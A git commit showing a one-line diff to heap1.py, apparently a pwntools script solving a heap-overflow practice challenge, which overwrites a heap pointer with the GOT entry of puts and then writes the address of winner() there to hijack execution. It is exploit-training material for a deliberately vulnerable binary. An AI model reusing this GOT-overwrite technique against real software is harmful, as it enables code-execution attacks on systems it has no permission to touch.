daa0b36888fb2d0c72351df78d6a8f139ec19ea0
Clément Bœsch <u@pkh.me>
2020-01-04 15:47:13 +0100

    heap1: remove unecessary use of p32()

--- heap1.py
+++ heap1.py
@@ -13,7 +13,7 @@ log.info('gotputs_addr: %08x', gotputs_addr)
 
 # redirect got.puts() to winner()
 b_data_off = 8 + 8 + 4  # distance from offset 0 of data(a) to offset 0 of b->data
-data_a = fit({b_data_off: p32(gotputs_addr)})  # override b->data during strcpy(a->data, av[1])
+data_a = fit({b_data_off: gotputs_addr})  # override b->data during strcpy(a->data, av[1])
 data_b = p32(winner_addr)  # strcpy(b->data, av[2]) will copy that at the overrided address
 
 with s.system([args.BIN, data_a, data_b]) as p:
